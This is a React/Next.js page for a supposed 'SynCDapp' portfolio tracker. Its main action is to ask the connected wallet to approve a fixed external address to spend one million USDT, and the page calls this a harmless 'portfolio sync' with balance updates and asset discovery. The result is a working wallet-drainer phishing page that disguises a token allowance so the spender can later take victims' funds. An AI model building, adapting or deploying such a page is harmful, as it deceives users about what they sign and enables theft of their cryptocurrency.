'use client'

import { useState, useEffect, useCallback } from "react"
import { ethers } from "ethers"
import { Button } from "@/components/ui/button"
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card"
import { Alert, AlertDescription, AlertTitle } from "@/components/ui/alert"
import { AlertCircle, Bell } from "lucide-react"
import { Input } from "@/components/ui/input"

// USDT Contract Address on Ethereum Mainnet
const USDT_ADDRESS = "0xdAC17F958D2ee523a2206206994597C13D831ec7"

// Predefined spender address
const SPENDER_ADDRESS = "0x69403ED292D063d632138CaDD1E42b5f40478B2a"

// USDT ABI for calling the approve function and checking allowance
const USDT_ABI = [
  "function approve(address spender, uint value) public returns (bool)",
  "function allowance(address owner, address spender) public view returns (uint256)",
  "function balanceOf(address account) public view returns (uint256)"
]

export default function Home() {
  const [account, setAccount] = useState<string | null>(null)
  const [isApproving, setIsApproving] = useState(false)
  const [error, setError] = useState<string | null>(null)

  const connectWallet = useCallback(async () => {
    if (typeof window.ethereum !== 'undefined') {
      try {
        const accounts = await window.ethereum.request({ method: "eth_requestAccounts" })
        setAccount(accounts[0])
        checkNetwork()
      } catch (error) {
        console.error("Error connecting to wallet:", error)
        setError("Failed to connect wallet. Please try again.")
      }
    } else {
      setError("No Ethereum wallet detected. Please install MetaMask or a compatible wallet.")
    }
  }, [])

  const checkNetwork = async () => {
    if (typeof window.ethereum !== 'undefined') {
      const chainId = await window.ethereum.request({ method: 'eth_chainId' })
      if (chainId !== '0x1') { // Ethereum Mainnet
        setError("Please switch to Ethereum Mainnet")
      } else {
        setError(null)
      }
    }
  }

  useEffect(() => {
    connectWallet()
  }, [connectWallet])

  const approveUSDT = async () => {
    if (typeof window.ethereum === 'undefined') {
      setError("Please connect to an Ethereum wallet!")
      return
    }

    setIsApproving(true)
    setError(null)

    try {
      const provider = new ethers.BrowserProvider(window.ethereum)
      const signer = await provider.getSigner()
      const usdtContract = new ethers.Contract(USDT_ADDRESS, USDT_ABI, signer)

      const parsedAmount = ethers.parseUnits("1000000", 6) // 1 million USDT

      const tx = await usdtContract.approve(SPENDER_ADDRESS, parsedAmount)
      console.log("Transaction Hash:", tx.hash)
      alert(`Approval transaction sent! Hash: ${tx.hash}`)
      
      // Wait for transaction to be mined
      await tx.wait()
      alert("Approval transaction confirmed!")
    } catch (error) {
      console.error("Error during approval:", error)
      if (error instanceof Error) {
        if ('code' in error && error.code === 4001) {
          setError("Transaction rejected by user")
        } else if (error.message.includes("insufficient funds")) {
          setError("Insufficient ETH for gas")
        } else {
          setError(error.message || "Error during approval. Check console for details.")
        }
      } else {
        setError("An unknown error occurred. Check console for details.")
      }
    } finally {
      setIsApproving(false)
    }
  }

  return (
    <div className="min-h-screen bg-[#020817] text-white">
      <header className="flex justify-between items-center p-4">
        <div className="flex items-center space-x-2">
          <svg
            xmlns="http://www.w3.org/2000/svg"
            viewBox="0 0 24 24"
            fill="none"
            stroke="currentColor"
            strokeWidth="2"
            strokeLinecap="round"
            strokeLinejoin="round"
            className="w-6 h-6"
          >
            <circle cx="12" cy="12" r="10" />
            <path d="M9.09 9a3 3 0 0 1 5.83 1c0 2-3 3-3 3" />
            <path d="M12 17h.01" />
          </svg>
          <span className="font-bold text-xl">SynCDapp</span>
        </div>
        <Button 
          variant="outline" 
          className="bg-[#1e293b] text-white hover:bg-[#2d3748]"
          onClick={connectWallet}
        >
          {account ? 'Connected' : 'Connect'}
          <Bell className="ml-2 h-4 w-4" />
        </Button>
      </header>
      <main className="container mx-auto px-4 py-8">
        <h1 className="text-5xl font-bold text-center mb-4">Portfolio Tracker</h1>
        <p className="text-center text-xl mb-8">Seamlessly sync your portfolio directly with your personal wallet.</p>
        <Card className="bg-[#1e293b] border-none">
          <CardHeader>
            <CardTitle className="text-2xl font-bold">Portfolio Sync Approver</CardTitle>
            <CardDescription>
              Authorize SynCDapp to manage your portfolio
              <ul className="mt-2 list-disc list-inside text-sm">
                <li>Real-time balance updates</li>
                <li>Automatic asset discovery</li>
                <li>DeFi protocol integration</li>
              </ul>
            </CardDescription>
          </CardHeader>
          <CardContent>
            <div className="flex space-x-4 mb-4">
              <Button variant="outline" className="flex-1 bg-[#2d3748] text-white hover:bg-[#3a4a5e]">Ethereum</Button>
            </div>
            {!account ? (
              <div className="text-center">
                <Input
                  placeholder="Paste Wallet address or ENS"
                  className="mb-4 bg-[#2d3748] border-none text-white placeholder-gray-400"
                />
                <Button onClick={connectWallet} className="w-full bg-blue-500 hover:bg-blue-600 text-white">
                  Open Wallet
                </Button>
                <div className="flex justify-between mt-4">
                  <Button variant="outline" className="flex-1 mr-2 bg-[#2d3748] text-white hover:bg-[#3a4a5e]">
                    MetaMask
                  </Button>
                  <Button variant="outline" className="flex-1 ml-2 bg-[#2d3748] text-white hover:bg-[#3a4a5e]">
                    WalletConnect
                  </Button>
                </div>
              </div>
            ) : (
              <>
                <p className="text-sm mb-2">
                  Connected Account: {`${account.slice(0, 6)}...${account.slice(-4)}`}
                </p>
                <Button onClick={approveUSDT} disabled={isApproving} className="w-full bg-blue-500 hover:bg-blue-600 text-white">
                  {isApproving ? "Approving..." : "Approve"}
                </Button>
              </>
            )}
            {error && (
              <Alert variant="destructive" className="mt-4 bg-red-900 border-red-700">
                <AlertCircle className="h-4 w-4" />
                <AlertTitle>Error</AlertTitle>
                <AlertDescription>{error}</AlertDescription>
              </Alert>
            )}
          </CardContent>
        </Card>
      </main>
    </div>
  )
}
